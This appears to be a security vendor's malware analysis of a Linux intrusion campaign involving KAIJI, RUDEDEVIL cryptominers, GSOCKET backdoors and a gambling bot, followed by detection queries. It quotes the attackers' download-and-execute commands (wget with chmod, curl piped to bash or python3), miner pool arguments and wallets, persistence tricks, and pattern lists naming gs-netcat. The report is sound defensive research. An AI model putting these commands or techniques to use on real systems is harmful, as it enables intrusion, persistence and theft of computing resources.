The attackers initiated the compromise in March 2024 by exploiting an Apache2 web server. Gaining initial access the threat actors deployed a complex intrusion set to establish persistence and expand their control over the compromised host.\n\nThe threat actors utilized a mixture of tools and malware, including C2 channels disguised as kernel processes, telegram bots for communication, and cron jobs for scheduled task execution. Notably, they deployed multiple malware families, such as KAIJI and RUDEDEVIL, alongside custom-written malware. KAIJI, known for its DDoS capabilities, and RUDEDEVIL, a cryptocurrency miner, were used to exploit system resources for malicious purposes.\n\nOur investigation revealed a potential Bitcoin/XMR mining scheme that leverages gambling APIs, suggesting the attackers might be conducting money laundering activities using compromised hosts. We also gained access to a file share that hosted daily uploads of fresh KAIJI samples with previously unseen hashes, indicating active development and adaptation by the malware authors.\n\nThis research publication delves into the details of the campaign, providing a comprehensive analysis of the attackers' tactics, techniques, and procedures. We explore how they established initial access, the methods used for persistence and privilege escalation, and the malware deployed at each stage. Additionally, we discuss the command and control infrastructure, including the use of GSOCKET and Telegram for stealthy communication.\n\n## Execution flow\n\n### Initial access\n\nOur team observed a host that was initially compromised in March 2024 by obtaining arbitrary code execution on a server running Apache2. Evidence of this compromise is seen in the execution of the `id` command via the Apache2 process, after which we see the threat actor exploiting the web server and deploying KAIJI malware under the `www-data` user account.\n\nShortly after the Kaiji deployment, the attacker used the `www-data` account to download a script named `00.sh` from the URL `http://61.160.194[.]160:35130`, which, after further investigation, also hosted several versions of RUDEDEVIL malware.\n\n`00.sh` is a stager that:\n\n* Sets its default shell and PATH.\n* Deletes several log files to erase traces of execution.\n* Leverages `ps`, `netstat`, `lsof` and a list of common mining process names to kill any potential mining competition on the compromised host.\n* Flushes the `iptables` rules on the host, sets several `iptables` rules to block connections to specific destination ports and mining pools, and disables `iptables`.\n* Finally, a second stage (`sss6`/`sss68`) is downloaded and executed, and execution traces are erased.\n\nThe figure below shows a compressed version of the stager. Lines annotated with `[...]` are shortened to enhance readability. \n\n![Compressed version of the 00.sh stager](/assets/images/betting-on-bots/image5.png \"Compressed version of the 00.sh stager\")\n\n### Fileserver\n\nVia the backdoored web server process, the attacker downloaded and executed malware through the following command:\n\n```\nsh -c wget http://107.178.101[.]245:5488/l64;chmod 777 l64;./l64;rm -r l64;wget http://107.178.101[.]245:5488/l86;chmod 777 l86;./l86;rm -r l86\n```\n\nThe `l64` and `l86` files are downloaded from `http://107.178.101[.]245:5488`, after which they are granted all permissions, executed, and removed. Looking at the server that is hosting these malware samples, we see the following:\n\n![Rejetto File Server Hosting Several Pieces of Malware](/assets/images/betting-on-bots/image30.png \"Rejetto File Server Hosting Several Pieces of Malware\")\n\nThis seems to be a file server, hosting several types of malware for different architectures. The file server leverages the Rejetto technology. These malwares have upload dates and download counters. For example, the `download.sh` file that was uploaded September 10th, was already downloaded 3,100 times. \n\n![Download Counter Indicating 3000+ Downloads Within 2 Weeks of Upload](/assets/images/betting-on-bots/image25.png \"Download Counter Indicating 3000+ Downloads Within 2 Weeks of Upload\")\n\n### RUDEDEVIL/LUCIFER\n\nUpon closer inspection, the file `sss6`, which was downloaded and executed, has been identified as the RUDEDEVIL malware. Early in the execution process, we encounter an embedded message characteristic of this malware family:\n\n![RUDEDEVIL Malware Characteristic](/assets/images/betting-on-bots/image11.png \"RUDEDEVIL Malware Characteristic\")\n\n```\nHi, man. I\\'ve seen several organizations report my Trojan recently, \nPlease let me go. I want to buy a car. That\\'s all. I don\\'t want to hurt others. \nI can\\'t help it. My family is very poor. In China, it\\'s hard to buy a suite. \nI don\\'t have any accommodation. I don\\'t want to do anything illegal. \nReally, really, interested, you can give me XmR, my address is 42cjpfp1jJ6pxv4cbjxbbrmhp9yuzsxh6v5kevp7xzngklnutnzqvu9bhxsqbemstvdwymnsysietq5vubezyfoq4ft4ptc, \nthank yo\n```\n\nWe note that the files `l64` and `l86` that are hosted on the file server contain the same malware. When analyzing the execution flow of the malware we see that the main function of the malware performs several key tasks:\n\n* **Daemon Initialization:** The process is converted into a daemon using `daemon(1, 0)`.\n* **Socket Creation:** A socket is created and bound to a specific port.\n* **Signal Handling:** Custom signal handlers are set up for various signals.\n* **Service Initialization:** Several services are started using `SetFILE`.\n* **Privilege Handling:** It checks for root privileges and adjusts resource limits accordingly.\n* **Decryption:** The malware decrypts its configuration blobs.\n* **Thread Creation:** Multiple threads are spawned for tasks like mining, killing processes, and monitoring network and CPU usage.\n* **Main Loop:** The program enters an infinite loop where it repeatedly connects to a server and sleeps for a specified duration.\n\nWhen examining the encryption routine, we find it utilizes XOR-based encoding:\n\n![DareDevil Encryption Routine](/assets/images/betting-on-bots/image13.png \"DareDevil Encryption Routine\")\n\nTo decode the contents statically, we developed a basic Python snippet:\n\n``` python\ndef DecryptData(data_block, encryption_key):\n   key_modifier = encryption_key & 0xFF\n   key_index = key_modifier // 0x5F  # 0x5F = 95 in decimal\n   modifier = (key_modifier - (key_index * 0x5F)) + 0x58  # 0x58 = 88 in decimal\n\n   for i in range(len(data_block)):\n       data_block[i] ^= modifier\n       data_block[i] &= 0xFF  # Ensure 8-bit value\n       data_block[i] += modifier\n       data_block[i] &= 0xFF  # Ensure 8-bit value\n\n   return data_block\n\n# Encoded data as hex strings\nencoded_data = [\n   '4c494356515049490c467978',\n   '0d4f1e4342405142454d0b42534e380f0f5145424f0c53034e4f4f4a0c4f40573801393939391e0d451e020141303727222026254f252d372643400706314955032a593330233237587951215553552d464c0101414939514401515258414324273340254756564741404207004122782d50475555412d503106394d4c34554e48513926352054362a1e0d4e1e20',\n   '0f424d4e0f435536575649484b',\n   '5642424e380f0f5654430c42014a494c45460c534f4d38070602050f435352434356544b',\n]\n\nencryption_key = 0x03FF  # 1023 in decimal\n\n# Process and decrypt each encoded data string\nfor data in encoded_data:\n   # Convert hex string to list of integers\n   data_bytes = bytes.fromhex(data)\n   data_block = list(data_bytes)\n\n   # Decrypt the data\n   decrypted_block = DecryptData(data_block, encryption_key)\n\n   # Convert decrypted data back to bytes\n   decrypted_bytes = bytes(decrypted_block)\n   print(\"Decrypted text:\", decrypted_bytes.decode('utf-8', errors='ignore'))\n```\n\nAfter decoding the configuration, the following values are revealed:\n\n* The first value C2 domain `nishabii[.]xyz`.\n* The second value reveals options that will be passed to XMRIG.\n* The third value shows the temp file location the malware uses.\n* The fourth and last string shows the download location for the XMRIG binary.\n\n### Thread Management in the Malware\n\nThe malware initiates several threads to handle its core operations. Let’s explore how some of these functions work in detail.\n\n#### Understanding the KillPid Function\n\nOne of the threads runs the KillPid function, which is designed to continuously monitor and manage processes. The function begins by detaching its current thread, allowing it to run in the background without blocking other processes. It then enters an infinite loop, repeatedly executing its tasks.\n\nAt the heart of its functionality is an array called `sb_name`, which contains the names of processes the malware wants to terminate. \n\n![RUDEDEVIL kill process array](/assets/images/betting-on-bots/image24.png \"RUDEDEVIL kill process array\")\n\nEvery two seconds, the function checks the system for processes listed in this array, retrieving their process IDs (PIDs) using a helper function called `getPidByName`. After each iteration, it moves to the next process in the list, ensuring all processes in `sb_name` are handled.\n\nInterestingly, after processing all elements in the array, the function enters an extended sleep for 600 seconds — roughly 10 minutes — before resuming its process checks. This extended sleep period is likely implemented to conserve system resources, ensuring the malware doesn't consume too much CPU time while monitoring processes.\n\n#### Understanding the Get_Net_Messages Function\n\nAnother crucial thread is responsible for monitoring network traffic, specifically focusing on the `eth0` network interface. This functionality is handled by the `getOutRates` function. The function begins by setting up necessary variables and opening the `/proc/net/dev` file, which contains detailed network statistics for each interface.\n\n![Getting network rates from /proc/net/dev](/assets/images/betting-on-bots/image22.png \"Getting network rates from /proc/net/dev\")\n\nIf the file is successfully opened, the malware reads a block of data — up to 1024 bytes — and processes it to extract the relevant network statistics. It specifically looks for the `eth0` interface, parsing the output rate data using a standard string parsing method. If successful, the function returns the output rate for `eth0`; otherwise, it returns `0`, ensuring the malware continues functioning even if an error occurs.\n\nThis routine allows the malware to quietly monitor the network activity of the infected machine, likely to track data being sent or received across the interface.\n\n#### Understanding the Get_Cpu_Message Function\n\nFor CPU monitoring, the malware uses the `GetCpuRates` function. This function continuously monitors the CPU usage by reading data from `/proc/stat`. Similar to how the network data is handled, the CPU statistics are read and parsed, allowing the malware to calculate the system's CPU usage.\n\n![Getting CPU information from /proc/stat](/assets/images/betting-on-bots/image34.png \"Getting CPU information from /proc/stat\")\n\nThe function operates in an infinite loop, sleeping for one second between each iteration to avoid overwhelming the system. If the file cannot be opened for some reason, the function logs an error and gracefully exits. However, as long as it’s able to read the file, it continually monitors CPU usage, ensuring the malware remains aware of system performance.\n\n#### Understanding the Send_Host_Message Function\n\nPerhaps the most critical thread is the one responsible for sending system information back to the malware operators. The `_SendInfo` function performs this task by collecting data about the infected system’s CPU and network usage. It begins by setting up buffers and preparing file paths to gather the necessary data. Depending on the system’s status, it formats the CPU and network usage into a string.\n\n![Sending system info back to the C2](/assets/images/betting-on-bots/image19.png \"Sending system info back to the C2\")\n\nAdditionally, the function checks whether a particular process is running on the system and adjusts its formatted message accordingly. Finally, it sends this formatted data back to the command-and-control server via a socket connection.\n\nIn essence, this function allows the malware to remotely monitor the infected machine, gathering key details like CPU load and network activity. The operators can use this information to assess the status of their infection and adjust their activities as needed.\n\n### Connecting to the Command-and-Control (C2) Server\n\nOnce all the threads are up and running, the malware shifts its focus to establishing a connection with its C2 server. This is managed by the `ConnectServer` function in the main thread, which handles communication with the server and executes commands remotely.\n\n#### Understanding the ConnectServer Function\n\nThe first task the `ConnectServer` function performs is establishing a connection to the C2 server using `ServerConnectCli`. After successfully connecting, the malware configures the socket to enable keep-alive settings, ensuring that the connection remains stable over extended periods of time.\n\nOnce the connection is set up, the malware collects various pieces of system information, including the hostname, user information, CPU specs, and memory details. This information is then sent to the server as an initial data payload, providing the attackers with a detailed view of the infected machine.\n\nAfter this initial setup, the malware enters an ongoing loop where it awaits and processes commands from the server. The types of commands handled are varied and can include tasks like launching a DDoS attack, stopping or starting CPU-intensive operations, executing system commands, or managing cryptocurrency mining activities. The loop continues indefinitely, ensuring that the malware is ready to execute any command sent by its operators.\n\nWhen the connection is no longer needed, or when the malware receives a termination command, it gracefully closes the socket, ending the session with the server.\n\n#### Command-and-Control (C2) Commands\n\nThe `ConnectServer` function processes a variety of commands from the C2 server, each designed to control a different aspect of the infected system. Here’s a breakdown of the commands handled by the malware:\n\n* **Case 4:** The malware calls the `DealwithDDoS` function, likely initiating a Distributed Denial of Service (DDoS) attack.\n* **Case 5:** Sets the `StopFlag` to `1`, which could signal the malware to stop specific tasks.\n* **Case 6:** Downloads a file from the server using `http_get`, changes its permissions, and then executes it. This command allows the attackers to run additional malware or scripts on the infected machine.\n* **Case 7:** Executes a system command using the `system` function, providing the attackers with direct control over the system’s command line.\n* **Case 8:** Sets `StopCpu` to `0`, restarting any previously halted CPU tasks.\n* **Case 9:** Sets `StopCpu` to `1`, halting all CPU tasks.\n* **Case 0xA:** Updates the CPU mining configuration with new data and retrieves the PID of the current process, allowing the malware to modify its cryptocurrency mining operations.\n* **Case 0xB:** Sets `stopxmr` to `1`, effectively stopping the XMRIG miner.\n* **Case 0xC:** Resets `stopxmr` to `0` and retrieves the current process PID, resuming the mining activity.\n\n![Processing of C2 commands](/assets/images/betting-on-bots/image19.png \"Processing of C2 commands\")\n\nEach command gives the malware operators precise control over how the infected machine behaves, whether it’s participating in a DDoS attack, running new malware, or managing mining operations.\n\n### Variants of RUDEDEVIL Malware and XMRIG Configuration\n\nWhile the file server mentioned before was active, we observed multiple versions of the RUDEDEVIL malware being uploaded. The core functionality of these versions remained largely the same, with the only significant variation being the embedded XMRIG commands used for cryptocurrency mining.\n\nEach version of the malware was configured to connect to the same mining pool, `c3pool.org`, but with slight differences in the parameters passed to the XMRIG miner:\n\n* `-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p R`\n* `-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p 2`\n* `-o stratum+tcp://auto.c3pool[.]org:19999 -u 41qBGWTRXUoUMGXsr78Aie3LYCBSDGZyaQeceMxn11qi9av1adZqsVWCrUwhhwqrt72qTzMbweeqMbA89mnFepja9XERfHL -p php`\n* `-o stratum+tcp://auto.c3pool[.]org:19999 -u 42CJPfp1jJ6PXv4cbjXbBRMhp9YUZsXH6V5kEvp7XzNGKLnuTNZQVU9bhxsqBEMstvDwymNSysietQ5VubezYfoq4fT4Ptc -p 0`\n\nEach of these commands directs the miner to connect to the same mining pool but specifies different wallets or configurations. By examining the `c3pool` application, we confirmed that both XMR addresses associated with these commands are currently active and mining.\n\n![C3pool mining revenue](/assets/images/betting-on-bots/image9.png \"C3pool mining revenue\")\n\nAdditionally, through this analysis, we were able to estimate the total profit generated by these two mining campaigns, highlighting the financial impact of the RUDEDEVIL malware and its connection to illegal cryptocurrency mining operations.\n\n## GSOCKET\n\nTo establish persistence, the threat actor downloaded and installed [GSOCKET](https://github.com/hackerschoice/gsocket), a network utility designed to enable encrypted communication between machines that are behind firewalls or NAT. GSOCKET creates secure, persistent connections through the Global Socket Relay Network (GSRN). This open-source tool includes features like AES-256 encryption, support for end-to-end communication security, and compatibility with SSH, netcat, and TOR, which allow for encrypted file transfers, remote command execution, and even the creation of hidden services.\n\nAlthough GSOCKET is not inherently malicious, its features can be leveraged for suspicious purposes.\n\nOnce deployed, GSOCKET performs several actions to maintain persistence and conceal its presence. First, it checks the system for active kernel processes to decide which process it will masquerade as:\n\n![GSOCKET Kernel Process Masquerading](/assets/images/betting-on-bots/image7.png \"GSOCKET Kernel Process Masquerading\")\n\nIt then creates the `/dev/shm/.gs-1000` directory to download and store its binary in shared memory. Additionally, by default, it sets up an `/htop` directory under `/home/user/.config/htop/` to store both the GSOCKET binary and the secret key used for its operations. \n\nNext, a cron job that runs the GSOCKET binary with the secret key every minute is set up.\n\n![GSOCKET Crontab Persistence](/assets/images/betting-on-bots/image21.png \"GSOCKET Crontab Persistence\")\n\nThe binary is executed under the name of a kernel process using the `exec -a [process_name]` command, further enhancing the ability to evade detection. The cron job includes a base64 encoded command that, when decoded, ensures the persistence mechanism is regularly executed and disguised as a legitimate kernel process:\n\nWhen decoding the payload, we see how the `defunct.dat` secret key is used as an argument to execute the `defunct` binary, which is masqueraded as `[raid5wq]` through the use of `exec -a `command:\n\nIn addition to using cron jobs, GSOCKET has the capability to establish persistence through shell profile modification, run control (`rc.local`) and Systemd. GSOCKET enumerates potential persistence locations:\n\n![GSOCKET Persistence Technique Enumeration](/assets/images/betting-on-bots/image29.png \"GSOCKET Persistence Technique Enumeration\")\n\nGSOCKET supports multiple webhooks, such as Telegram or Discord integrations, enabling remote control and notifications:\n\n![GSOCKET Webhook Capabilities](/assets/images/betting-on-bots/image14.png \"GSOCKET Webhook Capabilities\")\n\nFinally, after installation, GSOCKET ensures that all files that are created or modified, will be timestomped to attempt to erase any trace of installation:\n\n![GSOCKET Timestomping Capability](/assets/images/betting-on-bots/image16.png \"GSOCKET Timestomping Capability\")\n\nThese features make GSOCKET an attractive tool for threat actors seeking stealth and persistence. In this campaign, GSOCKET was exploited to establish covert channels back to C2 servers while attempting to evade detection. \n\nAdditionally, a PHP payload was fetched from an external IP and saved as `404.php`, likely functioning as a backdoor for future access. We did not manage to obtain this payload.\n\n### Post compromise dwell time\n\nAfter a three-week period of quiet with no noticeable activity, the threat actors resumed operations by utilizing the built-in Python3 to establish a reverse connection to a new command-and-control server.\n\nAfter regaining access to the host, a newer version of the KAIJI malware was deployed.\n\n### KAIJI malware: a comparison to previous samples\n\nWhile investigating the files on the discovered file server, we saw a shell script. This shell script seems to be the main file used to download by an earlier stage, ensuring the correct architecture for the victim is used.\n\n![KAIJI Download.sh Script](/assets/images/betting-on-bots/image2.png \"KAIJI Download.sh Script\")\n\nThe same Shell script is found in other reports where this script is used to deploy KAIJI.\n\nAs part of our investigation, we analyzed the KAIJI malware samples found on the file server and compared them with samples identified by Black Lotus Labs in 2022. Their detailed analysis of `Chaos` (KAIJI) can be found in their blog post[ here](https://blog.lumen.com/chaos-is-a-go-based-swiss-army-knife-of-malware/).\n\nUsing [BinDiff](https://github.com/google/bindiff), a binary comparison tool, we compared the functions in the binaries. The analysis revealed that the code in our sample was identical to the previously identified KAIJI sample from 2022.\n\n![Bindiff for Old and New Version of KAIJI](/assets/images/betting-on-bots/image18.png \"Bindiff for Old and New Version of KAIJI\")\n\nAlthough the code was the same, one critical difference stood out: the C2 server address. Although the functionality remained consistent in both binaries, they pointed to different C2 domains.\n\nDelving deeper into the disassembly, we identified a function named `main_Link`. This function is responsible for decoding the C2 server address used by the malware.\n\n![KAIJI main_link Function](/assets/images/betting-on-bots/image31.png \"KAIJI main_link Function\")\n\nOnce decoded, the function searches for the `|(odk)/*-` postfix in the address and removes it, leaving only the C2 domain and port. This process ensures the malware can communicate with its C2 server, though the address it contacts may change between samples.\n\nGiven that some resources have been published that statically reverse engineer KAIJI, we will instead take a more detailed look at its behaviors.\n\n![KAIJI Dynamic Analysis - Part 1](/assets/images/betting-on-bots/image12.png \"KAIJI Dynamic Analysis - Part 1\")\n\nAfter execution, KAIJI creates several files in the `/etc/` and `/dev/` directories, `/etc/id.services.conf`, `/etc/32678`, `/dev/.img` and `/dev/.old`. These scripts are places to establish persistence. \n\nTwo services are set up, `/etc/init.d/linux_kill` and `crond.service`. `crond.service` is executed by Systemd, while `linux_kill` is used for SysVinit persistence.\n\nAfter reloading the Systemd daemon, the first network connection to the C2 is attempted.\n\n![KAIJI Dynamic Analysis - Part 2](/assets/images/betting-on-bots/image18.png \"KAIJI Dynamic Analysis - Part 2\")\n\nNext, the `Systemd Late generator` service file is created. More information on the workings of `Systemd`, and different ways of establishing persistence through this method can be found in our recent blog series dubbed [Linux Detection Engineering -  A primer on persistence mechanisms](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms).\n\nKAIJI creates the `/boot/System.img.config` file, which is an executable that is executed through the previously deployed `Systemd` services. This binary, is amongst other binaries, another way of establishing persistence. \n\n![KAIJI Dynamic Analysis - Part 3](/assets/images/betting-on-bots/image26.png \"KAIJI Dynamic Analysis - Part 3\")\n\nNext, KAIJI adjusts the `SELinux` policies to allow unauthorized actions. It searches audit logs for denied operations related to `System.img.conf`, generates a new `SELinux` policy to permit these actions, and installs the policy with elevated priority. By doing this, the malware bypasses security restrictions that would normally block its activity.\n\nAdditionally, it sets up multiple additional forms of persistence through bash profiles, and creates another two malicious artifacts; `/usr/lib/libd1rpcld.so` and `/.img`.\n\nRight after, `/etc/crontab` is altered through an echo command, ensuring that the `/.img` file is executed by root on a set schedule.\n\n![KAIJI Dynamic Analysis - Part 4](/assets/images/betting-on-bots/image20.png \"KAIJI Dynamic Analysis - Part 4\")\n\nKAIJI continues to move several default system binaries to unusual locations, attempting to evade detection along the way.\n\n![KAIJI Dynamic Analysis - Part 5](/assets/images/betting-on-bots/image17.png \"KAIJI Dynamic Analysis - Part 5\")\n\nKAIJI uses the `renice` command to grant PID `2957`, one of KAIJI's planted executables, the highest possible priority (on a scale of -20 to 19, lowest being the highest priority), ensuring it gets more CPU resources than other processes.\n\nTo evade detection, KAIJI employed the bind mount technique, a defense evasion method that obscures malicious activities by manipulating how directories are mounted and viewed within the system.\n\nFinally, we see a trace of `cron` executing the `/.img`, which was planted in the `/etc/crontab` file earlier.\n\n## The saga continues\n\nTwo weeks later, the Apache backdoor became active again. Another backdoor was downloaded via the `www-data` user through the Apache2 process using the command:\n\n```\nsh -c wget http://91.92.241[.]103:8002/gk.php\n```\n\nThe contents of this payload remain unknown. At this stage, we observed attempts at manual privilege escalation, with the attackers deploying `pspy64`. `Pspy` is a command-line tool for process snooping on Linux systems without requiring root permissions. It monitors running processes, including those initiated by other users, and captures events like cron job executions. This tool is particularly useful for analyzing system activity, spotting privilege escalation attempts, and auditing the commands and file system interactions triggered by processes in real time. It's commonly leveraged by attackers for reconnaissance in post-compromise scenarios, giving them visibility into system tasks and potential vulnerabilities​.\n\nNotably, `pspy64` was executed by the `[rcu_preempt]` parent, indicating that the threat actors had transitioned from leveraging the web server backdoor to using the GSOCKET backdoor.\n\nFurther attempts at privilege escalation involved exploiting `CVE-2021-4034`, also known as `pwnkit`. This vulnerability affects the `pkexec` component of the PolicyKit package in Linux systems, allowing an unprivileged user to execute arbitrary code with root privileges. By leveraging this flaw, an attacker can gain elevated access to the system, potentially leading to full control over the affected machine.\n\n### Custom built binaries\n\nRight after, the attackers attempted to download a custom-built malware named `apache2` and `apache2v86` from:\n\n* `http://62.72.22[.]91/apache2`\n* `http://62.72.22[.]91/apache2v86`\n\nWe obtained copies of these files, which currently have zero detections on VirusTotal. However, when executing them dynamically, we observed segmentation faults, and our telemetry confirmed segfault activity on the compromised host. Over a week, the threat actor attempted to alter, upload and execute these binaries more than 15 times, but due to repeated segfaults, it is unlikely that they succeeded in running this custom malware.\n\nWhile the binaries failed to execute, they still provided valuable insights during reverse engineering. We uncovered several XOR-encoded strings within the samples.\n\n![Apache2 XOR-Encoded Strings](/assets/images/betting-on-bots/image33.png \"Apache2 XOR-Encoded Strings\")\n\nThe XOR key used to encode the strings was identified as `0x79` (or the character `y`). After decoding the strings, we discovered fragments of an HTTP request header that the malware was attempting to construct:\n\n```\n/934d9091-c90f-4edf-8b18-d44721ba2cdc HTTP/1.1\nsec-ch-ua: \"Chromium\";v=\"122\", \"Google Chrome\";v=\"122\", \"Not-A.Brand\";v=\"99\nsec-ch-ua-platform: \"Windows\"\nupgrade-insecure-requests: 1\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nreferer: https://twitter[.]com\naccept-language: ru,en-US;q=0.9\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.\n```\n\nThis indicates that the malware was in the process of constructing HTTP requests. However, based on the incomplete nature of the headers and the repeated failures in execution, it’s clear that this piece of software was not yet fully developed or operational.\n\n### Additional reconnaissance \n\nThe attackers continued to use tools from The Hacker’s Choice, by downloading and executing [`whatserver.sh`](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/whatserver.sh).\n\nThis Shell script is designed to gather and display server information. It extracts details such as the fully qualified domain names (FQDNs) from SSL certificates, Nginx, and Apache configuration files, along with system resource information like CPU and memory usage, virtualization details, and network settings. The script can also summarize recent activities, including last logged-in users and currently listening services.\n\n### Mining activities\n\nAfter nearly two weeks of manual exploitation attempts, the threat actors ceased their efforts to escalate privileges, likely having failed to gain root access. Instead, they established persistence as the `www-data` user, leveraging GSOCKET to set up an SSL connection, which was disguised as a kernel process called `[mm_percpu_wq]`.\n\nAfter decoding the base64 contents, we get a very familiar looking output:\n\nThrough our behavioral rules, we see the threat actor listing the current user’s crontab entries, and echoing a payload directly into the crontab. \n\nThis command tries to download `http://gcp.pagaelrescate[.]com:8080/ifindyou` every minute, and pipe it to bash. Looking at the contents of `ifindyou`, we see the following Bash script:\n\n![Stage 1 - ifindyou.sh](/assets/images/betting-on-bots/image8.png \"Stage 1 - ifindyou.sh\")\n\nThis script gathers hostname and IP information, downloads the `SystemdXC` archive from `http://gcp.pagaelrescate[.]com:8080/t9r/SystemdXC` (XMRIG), stores this in `/tmp/SystemdXC`, extracts the archive and executes it with the necessary parameters to start mining Bitcoin.\n\nWhen examining the mining command, we can see how the malware configures XMRIG:\n\nThis command connects to the `unmineable.com` mining pool, using the infected machine’s hostname as an identifier in the mining process. At the time of writing, there are 15 active workers mining Bitcoin for the wallet address `1CSUkd5FZMis5NDauKLDkcpvvgV1zrBCBz`.\n\n![Bitcoin Address Lookup](/assets/images/betting-on-bots/image1.png \"Bitcoin Address Lookup\")\n\nUpon further investigation into the Bitcoin address, we found that this address has performed a single transaction.\n\n![Bitcoin Transaction](/assets/images/betting-on-bots/image32.png \"Bitcoin Transaction\")\n\nInterestingly, the output address for this transaction points to a well-known [hot wallet](https://www.ledger.com/academy/topics/security/hot-wallet-vs-cold-crypto-wallet-whats-the-difference) associated with Binance, indicating that the attackers may have transferred their mining earnings to an exchange platform.\n\n![Binance Wallet Destination](/assets/images/betting-on-bots/image10.png \"Binance Wallet Destination\")\n\nWhen returning our focus back to the script, we also see two commands commented out, which will become more clear later. The script executes:\n\n```\ncurl -s http://gcp.pagaelrescate[.]com:8080/cycnet | bash\n```\n\nLooking at this payload, we can see the following contents:\n\n![Stage 2 - cycnet.sh](/assets/images/betting-on-bots/image23.png \"Stage 2 - cycnet.sh\")\n\nThis stage checks the output of the command, and sends this to a Telegram chat bot. Through our Telegram behavioral rule, we can see that a Telegram POST request looks like this:\n\nThe cron job that is set up during this stage executes at minute 0, every 4th hour. This job executes:\n\n```\ncurl -s http://gcp.pagaelrescate[.]com:8080/testslot/enviador_slot | python3\n```\n\nThe downloaded Python script automates interactions with an online gambling game through HTTP requests. The script includes functions that handle user authentication, betting, processing the outcomes, and sending data to a remote server.\n\nUpon closer examination, we identified the following key components of the script:\n\n**Global Variables:**\n\n* `usuario`: Stores the user ID for managing the session.\n* `apuesta`: Represents the bet amount.\n* `ganancias`: Tracks the winnings and losses.\n* `saldo_actual`: Holds the current account balance.\n\n![enviador_slot Global Variables](/assets/images/betting-on-bots/image3.png \"enviador_slot Global Variables\")\n\n#### Understanding the `obteneruid` Function\n\nThis function authenticates the user by sending a POST request with the necessary headers and JSON data to the remote server. If the user is not already set, it initializes a new session and retrieves the account balance. Upon successful authentication, it returns a session UUID, which is used for further interactions in the game.\n\n\n![enviador_slot obteneruid Function](/assets/images/betting-on-bots/image27.png \"enviador_slot obteneruid Function\")\n\n#### Understanding the `enviardatos` Function\n\nThis function sends game data or status updates back to `gcp.pagaelrescate[.]com`, logging the results or actions taken during gameplay. It uses a simple GET request to transmit this data to the remote server.\n\n![enviador_slot enviardatos Function](/assets/images/betting-on-bots/image4.png \"enviador_slot enviardatos Function\")\n\n#### Understanding the `hacerjugada` Function\n\nThe `hacerjugada` function simulates the betting process for a set number of rounds. It sends POST requests to place bets, updates the winnings or losses after each round, and calculates the overall results. If a bonus round is triggered, it calls `completarbono()` to handle any bonus game details. Between each betting round, the function enforces a 30-second delay to mimic natural gameplay and avoid detection.\n\n![enviador_slot hacerjugada Function](/assets/images/betting-on-bots/image28.png \"enviador_slot hacerjugada Function\")\n\n#### Understanding the `completarbono` Function\n\nWhen a bonus round is triggered, this function completes the round by sending a request containing the session ID and round ID. Based on the result, it updates the account balance and logs the winnings or losses. Any change in the balance is sent back to the remote server using the `enviardatos()` function.\n\n![enviador_slot completarbono Function](/assets/images/betting-on-bots/image6.png \"enviador_slot completarbono Function\")\n\n#### Likely Used for Testing Purposes\n\nIt’s important to note that this script is likely being used for testing purposes, as it interacts with the demo version of the gambling app. This suggests that the attackers might be testing the automation of gambling actions or trying to find vulnerabilities in the app before moving to the live version. The use of a demo environment implies they are refining their approach, potentially in preparation for more sophisticated or widespread attacks.\n\n## REF6138 through MITRE ATT&CK\n\nElastic uses the [MITRE ATT&CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.

These queries are used to identify potentially suspicious behavior, but an investigation is required to validate the findings.\n\n#### EQL queries\n\nUsing the Timeline section of the Security Solution in Kibana under the “Correlation” tab, you can use the below EQL queries to hunt for behaviors similar:\n\n**Potential XMRIG Execution**\n\nThe following EQL query can be used to hunt for XMRIG executions within your environment.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and (\n  (\n    process.args in (\"-a\", \"--algo\") and process.args in (\n      \"gr\", \"rx/graft\", \"cn/upx2\", \"argon2/chukwav2\", \"cn/ccx\", \"kawpow\", \"rx/keva\", \"cn-pico/tlo\", \"rx/sfx\", \"rx/arq\",\n      \"rx/0\", \"argon2/chukwa\", \"argon2/ninja\", \"rx/wow\", \"cn/fast\", \"cn/rwz\", \"cn/zls\", \"cn/double\", \"cn/r\", \"cn-pico\",\n      \"cn/half\", \"cn/2\", \"cn/xao\", \"cn/rto\", \"cn-heavy/tube\", \"cn-heavy/xhv\", \"cn-heavy/0\", \"cn/1\", \"cn-lite/1\",\n      \"cn-lite/0\", \"cn/0\"\n    )\n  ) or\n  (\n    process.args == \"--coin\" and process.args in (\"monero\", \"arqma\", \"dero\")\n  )\n) and process.args in (\"-o\", \"--url\")\n```\n\n**MSR Write Access Enabled**\n\nXMRIG leverages modprobe to enable write access to MSR. This activity is abnormal, and should not occur by-default.\n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and process.name == \"modprobe\" and\nprocess.args == \"msr\" and process.args == \"allow_writes=on\"\n```\n\n**Potential GSOCKET Activity**\n\nThis activity is default behavior when deploying GSOCKET through the recommended deployment methods. Additionally, several arguments are added to the query to decrease the chances of missing a more customized intrusion through GSOCKET. \n\n```\nprocess where event.type == \"start\" and event.action == \"exec\" and\nprocess.name in (\"bash\", \"dash\", \"sh\", \"tcsh\", \"csh\", \"zsh\", \"ksh\", \"fish\") and\nprocess.command_line : (\n\"*GS_ARGS=*\", \"*gs-netcat*\", \"*gs-sftp*\", \"*gs-mount*\", \"*gs-full-pipe*\", \"*GS_NOINST=*\", \"*GSOCKET_ARGS=*\", \"*GS_DSTDIR=*\", \"*GS_URL_BASE=*\", \"*GS_OSARCH=*\", \"*GS_DEBUG=*\", \"*GS_HIDDEN_NAME=*\", \"*GS_HOST=*\", \"*GS_PORT=*\", \"*GS_TG_TOKEN=*\", \"*GS_TG_CHATID=*\", \"*GS_DISCORD_KEY=*\", 